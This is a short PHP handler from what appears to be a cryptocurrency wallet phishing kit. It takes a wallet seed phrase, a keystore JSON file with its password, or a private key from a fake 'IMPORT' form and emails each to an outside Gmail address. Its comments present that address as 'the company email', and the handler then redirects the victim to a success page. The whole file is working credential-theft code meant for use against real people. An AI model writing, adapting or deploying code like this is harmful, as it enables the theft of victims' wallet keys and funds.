<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check which form was submitted
    if (isset($_POST['submit']) && $_POST['submit'] === 'IMPORT') {
        // Get the form data
        $value = $_POST['value'];

        // Check if the 'phrase' form was submitted
        if (isset($_POST['phrase'])) {
            $phrase = $_POST['phrase'];
            
            // Send the phrase to the company email
            mail('trademoney116@gmail.com', 'Phrase Submission', 'Phrase: ' . $phrase, 'From: connectwallet051@gmail.com', 'Reply-To: contactassistances5@gmail.com');
        }

        // Check if the 'keystorejson' form was submitted
        if (isset($_POST['keystorejson']) && isset($_POST['keystorepassword'])) {
            $keystorejson = $_POST['keystorejson'];
            $keystorepassword = $_POST['keystorepassword'];

            // Send the keystore JSON and password to the company email
            mail('trademoney116@gmail.com', 'Keystore JSON Submission', 'Keystore JSON: ' . $keystorejson . ' Password: ' . $keystorepassword, 'From: connectwallet051@gmail.com', 'Reply-To: contactassistances5@gmail.com');
        }

        // Check if the 'privatekey' form was submitted
        if (isset($_POST['privatekey'])) {
            $privatekey = $_POST['privatekey'];

            // Send the private key to the company email
            mail('trademoney116@gmail.com', 'Private Key Submission', 'Private Key: ' . $privatekey, 'From: connectwallet051@gmail.com', 'Reply-To: contactassistances5@gmail.com');
        }

        // Redirect to a success page
        header('Location: success.html');
        exit();
    }
}
?>
